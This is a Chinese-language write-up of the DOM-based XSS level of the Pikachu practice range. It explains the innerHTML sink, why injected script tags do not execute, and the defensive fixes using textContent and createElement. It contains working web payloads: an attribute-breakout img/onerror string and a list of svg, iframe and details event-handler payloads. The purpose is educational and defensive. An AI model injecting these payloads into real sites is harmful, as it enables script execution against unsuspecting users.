# DOM型 XSS 通关笔记
> 这关最反直觉的地方：**你在页面上输入的东西，一次都没有发给服务器。**
>
> 漏洞完全长在前端代码里——服务器连你是谁、输入了什么都不知道。
---
## 一、环境与目标
| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | Cross-Site Scripting → DOM型xss |
| 页面地址 | `http://pikachu/vul/xss/xss_dom.php` |
| 页面形式 | 一个输入框 + 一个 `click me!` 按钮 |
| 目标 | 让页面弹出一个对话框 |
页面长这样：
```
[__________]  [click me!]
（点按钮后，下方出现一个链接）
```
---
## 二、我的解题步骤
### 步骤 1：先按直觉试 `<script>`
在输入框里输入：
```html
<script>alert(1)</script>
```
点 `click me!`。
**没反应。** 页面上只多出一个链接，没有弹窗。
### 步骤 2：去源码里找原因
按 `F12` 看页面源码，发现按钮绑定的是这段 JS：
```javascript
function domxss(){
    var str = document.getElementById("text").value;
    document.getElementById("dom").innerHTML = "<a href='"+str+"'>what do you see?</a>";
}
```
关键在 `innerHTML`。
### 步骤 3：换一个不依赖 `<script>` 的 payload
在输入框里输入：
```html
'><img src=x onerror=alert(1)>
```
点 `click me!`。
**弹窗了。**
---
## 三、原理分析
### 3.1 完整源码
```javascript
function domxss(){
    var str = document.getElementById("text").value;
    document.getElementById("dom").innerHTML = "<a href='"+str+"'>what do you see?</a>";
}
```
```html
<input id="text" name="text" type="text" value="" />
<input id="button" type="button" value="click me!" onclick="domxss()" />
<div id="dom"></div>
```
服务器端只有这几行，**什么也没干**：
```php
if(isset($_GET['text'])){
    $haha = "这里是后台的处理逻辑";
}
```
### 3.2 payload 代入后发生了什么
模板是：
```javascript
"<a href='"+str+"'>what do you see?</a>"
```
payload 是 `'><img src=x onerror=alert(1)>`，代入后：
```html
<a href=''><img src=x onerror=alert(1)>'>what do you see?</a>
```
拆开看：
| 部分 | 作用 |
| --- | --- |
| `'` | 闭合 `href` 属性 |
| `>` | 闭合 `<a>` 标签 |
| `<img src=x onerror=alert(1)>` | 插入一个图片元素 |
| `src=x` | 地址不存在，加载失败 |
| `onerror=alert(1)` | 加载失败时执行 |
### 3.3 为什么 `<script>` 不行
这是 DOM XSS 最容易踩的坑。
> **用 `innerHTML` 插入的 `<script>` 标签，浏览器不会执行。**
这是 HTML 规范规定的行为：通过 `innerHTML` 设置的脚本不会被执行（防止简单的注入）。
所以 DOM XSS 里常用的 payload 都是"不需要 `<script>` 也能执行"的：
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
<details open ontoggle=alert(1)>
```

## 四、知识点与笔记
### 4.1 DOM XSS 的两个要素
| 要素 | 含义 | 这关的情况 |
| --- | --- | --- |
| **Source（源）** | 攻击者能控制的数据 | `document.getElementById("text").value` |
| **Sink（汇）** | 把数据当代码执行的地方 | `innerHTML` |
**Source 和 Sink 之间有一条通路，就是 DOM XSS。**
### 4.2 常见的 source
```javascript
location.href
location.search
location.hash
document.referrer
document.cookie
window.name
document.getElementById(...).value
```
### 4.3 常见的 sink
| Sink | 风险 |
| --- | --- |
| `innerHTML` | 高，会解析 HTML |
| `outerHTML` | 高 |
| `document.write()` | 高 |
| `eval()` | 极高 |
| `setTimeout(string)` | 高 |
| `element.src` | 中（可注 `javascript:`） |
| `innerText` / `textContent` | **安全**，只当文字 |
### 4.4 为什么它叫"DOM 型"
因为 payload **不会出现在服务器返回的 HTML 里**。
服务器返回的页面永远是干净的：
```html
<div id="dom"></div>
```
是**浏览器里的 JS** 在运行时把内容塞进去的。
所以：
- 抓包看不到 payload
- 服务器日志里也没有
- **WAF 基本拦不住**
---
## 五、和前面几关的区别
| | 反射型 / 存储型 | DOM 型 |
| --- | --- | --- |
| payload 经过服务器吗 | 经过 | **不经过** |
| 服务器返回的 HTML 里有 payload 吗 | 有 | **没有** |
| 谁把 payload 拼进页面 | 服务器（PHP） | **浏览器（JS）** |
| 抓包能看到吗 | 能 | **看不到** |
| 防御在哪一层 | 服务端输出转义 | **前端代码** |

## 六、防御怎么写
### 6.1 用安全的 API
```javascript
// 危险
document.getElementById("dom").innerHTML = "<a href='"+str+"'>...</a>";
// 安全：只当文字
document.getElementById("dom").textContent = str;
```
### 6.2 必须插入 HTML 时，手动构造元素
```javascript
var a = document.createElement("a");
a.href = "#";
a.textContent = "what do you see?";
document.getElementById("dom").appendChild(a);
```
### 6.3 如果一定要设属性
```javascript
// 校验协议，只允许 http/https
if (!/^https?:\/\//i.test(str)) str = "#";
a.href = str;
```
---
## 七、总结
| 要点 | 内容 |
| --- | --- |
| 这关教什么 | 漏洞可以完全不经过服务器 |
| 关键 sink | `innerHTML` |
| 关键坑 | `innerHTML` 不执行 `<script>` |
| 防御 | 用 `textContent` / `createElement`，别用 `innerHTML` 拼字符串 |
**一句话**：
> **服务器安全，不代表前端安全。DOM XSS 是"客户端自己的漏洞"。**
